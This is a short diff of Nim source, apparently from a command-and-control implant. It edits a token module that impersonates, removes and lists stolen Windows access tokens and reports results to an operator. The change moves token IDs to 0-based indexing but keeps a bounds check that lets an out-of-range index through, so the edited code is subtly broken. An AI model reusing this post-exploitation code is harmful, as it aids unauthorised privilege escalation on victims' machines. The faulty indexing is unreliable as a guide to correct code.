@@ -462,10 +462,10 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
             print fmt"   [>] Impersonating token from vault."
 
             let tokenId = int(Bytes.toUint32(task.args[0].data))
-            if tokenId < 1 or tokenId > ctx.tokenVault.len():
+            if tokenId < 0 or tokenId > ctx.tokenVault.len():
                 return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(fmt"Invalid token ID: {tokenId}"))
             
-            let hToken = ctx.tokenVault[tokenId - 1]
+            let hToken = ctx.tokenVault[tokenId]
             let username = getTokenUser(hToken).username
             impersonate(hToken)
 
@@ -486,11 +486,11 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
                 return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes("Removed all tokens from vault."))
             
             let tokenId = int(Bytes.toUint32(task.args[0].data))
-            if tokenId < 1 or tokenId > ctx.tokenVault.len():
+            if tokenId < 0 or tokenId > ctx.tokenVault.len():
                 return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(fmt"Invalid token ID: {tokenId}"))
 
-            CloseHandle(ctx.tokenVault[tokenId - 1])
-            ctx.tokenVault.del(tokenId - 1)
+            CloseHandle(ctx.tokenVault[tokenId])
+            ctx.tokenVault.del(tokenId)
 
             return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Removed token {tokenId} from vault."))
 
@@ -517,7 +517,7 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
             
             for i, hToken in ctx.tokenVault:
                 let handle = "0x" & toHex(cast[uint64](hToken), 6)
-                output &= ($(i + 1)).alignLeft(4) & handle.alignLeft(10) & getTokenUser(hToken).username & "\n"
+                output &= ($i).alignLeft(4) & handle.alignLeft(10) & getTokenUser(hToken).username & "\n"
             
             return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
         
